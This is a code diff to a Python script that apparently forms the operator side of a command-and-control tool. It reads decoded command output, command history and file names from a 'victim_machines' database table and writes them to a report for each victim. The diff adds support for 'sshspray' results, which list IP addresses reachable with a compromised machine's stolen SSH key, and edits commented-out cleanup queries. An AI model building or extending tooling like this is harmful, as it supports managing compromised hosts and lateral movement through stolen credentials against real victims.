@@ -26,7 +26,7 @@ def getoutput( id ):
 	Results = []
 
 	#query to check whether or not the id requested appears in the database
-	query = """ SELECT command_output, command_record, file_names FROM victim_machines WHERE victim_id =%s """
+	query = """ SELECT command_output, command_record, file_names, sshspray FROM victim_machines WHERE victim_id =%s """
 	data = (id,)
 
 	#https://www.mysqltutorial.org/python-mysql-update/
@@ -44,10 +44,12 @@ def getoutput( id ):
 			decoded_output = decode(result[0][0])
 			decoded_record = decode(result[0][1])
 			decoded_filenames = decode(result[0][2])
+			decoded_sshspray = decode(result[0][3])
 
 			record_data = json.loads(decoded_record)
 			output_data = json.loads(decoded_output)
 			filename_data = json.loads(decoded_filenames)
+			sshspray_data = json.loads(decoded_sshspray)
 
 			newfilename = id + ".txt"
 			file = open(newfilename, "a")
@@ -93,11 +95,19 @@ def getoutput( id ):
 				entry.epoch_id = datetime.datetime.fromtimestamp(int(entry.epoch_id))
 				file.write("%s   %s   %s\n" % (entry.epoch_id, entry.command, entry.output))
 
+			#add sshspray output to the end of the file
+			if sshspray_data:
+				for entry in sshspray_data:
+					output_string = "SSH Spraying was conducted and IP address " + entry + " can be accessed using this machine's SSH Key."
+					file.write("%s\n" % (output_string))
+
 			file.close()
 #			print(json.dumps(json_data, indent=2))
 
-#			cleanup_query = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s ""
-#			cursor.execute(cleanup_query,data)
+#			cleanup_query1 = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s """
+#			cleanup_query2 = """ UPDATE victim_machines SET sshspray = '' WHERE victim_id = %s """
+#			cursor.execute(cleanup_query1,data)
+#			cursor.execute(cleanup_query2,data)
 
 		else:
 			print("id not found in the database, try again")
